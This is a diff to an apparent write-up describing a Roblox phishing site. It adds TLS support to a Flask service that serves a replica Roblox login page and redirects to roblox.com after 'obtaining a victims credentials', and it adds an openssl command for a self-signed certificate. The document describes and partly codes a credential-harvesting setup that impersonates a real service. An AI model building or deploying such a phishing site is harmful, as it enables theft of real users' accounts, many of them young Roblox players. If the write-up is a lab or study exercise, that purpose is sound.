@@ -44,6 +44,7 @@ CMD ["python3", "service.py"]
 The `service.py` script just launches a normal `Flask` service which provides the landing page and a redirect after successfully obtaining a victims credentials. <br/>
 ```py
 from flask import *
+import ssl
 
 app = Flask(__name__)
 
@@ -71,8 +72,20 @@ def login():
 
     return redirect('https://www.roblox.com/login')
 
+# Generation of ssl cert
+def generate_ssl_context():
+    ssl_context = ssl.SSLContext(ssl.PROTOCOL_TLS)
+    ssl_context.load_cert_chain(certfile="cert.pem", keyfile="key.pem")
+    return ssl_context
+
 if __name__ == '__main__':
-    app.run(host="0.0.0.0")
+    ssl_context = generate_ssl_context()
+    app.run(host="0.0.0.0", port=443, ssl_context=ssl_context)
 ```
 
 I will not comment on the `html` and `css` files from roblox as they are just a simple replica of `roblox.com` and I have no rights whatsoever to reuse the actual source. (Please don't sue me.)
+
+At last I generated a `self-signed` SSL certificate using openssl which is than being used by `service.py`. <br/>
+```
+openssl req -x509 -nodes -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -subj "/CN=localhost"
+```
